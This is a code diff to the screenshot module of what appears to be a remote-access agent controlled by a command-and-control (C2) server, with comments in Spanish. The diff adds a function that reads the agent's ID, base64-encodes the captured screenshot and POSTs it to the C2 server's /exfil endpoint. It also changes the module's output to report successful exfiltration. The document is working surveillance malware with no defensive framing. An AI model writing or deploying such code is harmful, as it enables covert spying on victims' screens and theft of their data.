@@ -5,13 +5,49 @@ Cadena de intentos por entorno:
   Linux X11     → scrot → import (ImageMagick) → mss
   Windows       → Pillow ImageGrab
   macOS         → screencapture -x
+
+Tras capturar, intenta exfiltrar al servidor C2 via /exfil.
+Si falla, reporta la ruta local donde quedó guardado.
 """
 
+import base64
 import os
 import platform
 import subprocess
 
 _OUT = "/tmp/nexus_screenshot.png"
+
+
+def _exfil_screenshot(path: str) -> tuple[bool, str]:
+    import requests
+    server_url = os.environ.get("NEXUS_SERVER", "http://127.0.0.1:8080")
+    agent_id_file = os.path.join(os.path.dirname(__file__), "..", "..", "agent_id.txt")
+    try:
+        with open(agent_id_file) as f:
+            agent_id = f.read().strip()
+    except Exception:
+        agent_id = "unknown"
+    try:
+        with open(path, "rb") as f:
+            data = f.read()
+        payload = {
+            "agent_id": agent_id,
+            "filename": os.path.basename(path),
+            "size": len(data),
+            "data": base64.b64encode(data).decode(),
+        }
+        resp = requests.post(
+            f"{server_url}/exfil",
+            json=payload,
+            timeout=15,
+            headers={"Content-Type": "application/json"},
+        )
+        if resp.status_code == 200:
+            saved = resp.json().get("saved", "?")
+            return True, saved
+        return False, f"HTTP {resp.status_code}"
+    except Exception as exc:
+        return False, str(exc)
 
 
 def _try(cmd: list, out_path: str) -> bool:
@@ -93,7 +129,10 @@ def run(args: str) -> tuple[int, str, str]:
 
     if ok:
         size = os.path.getsize(path)
-        return 0, f"Screenshot guardado en {path} ({size} bytes)\n  Usa: !download file://{path} /dest/path", ""
+        exfil_ok, exfil_info = _exfil_screenshot(path)
+        if exfil_ok:
+            return 0, f"Screenshot capturado ({size} bytes) y exfiltrado al C2:\n  → {exfil_info}", ""
+        return 0, f"Screenshot capturado ({size} bytes) — guardado localmente en:\n  {path}\n  [exfil falló: {exfil_info}]", ""
 
     return 1, "", (
         "No se pudo capturar pantalla.\n"
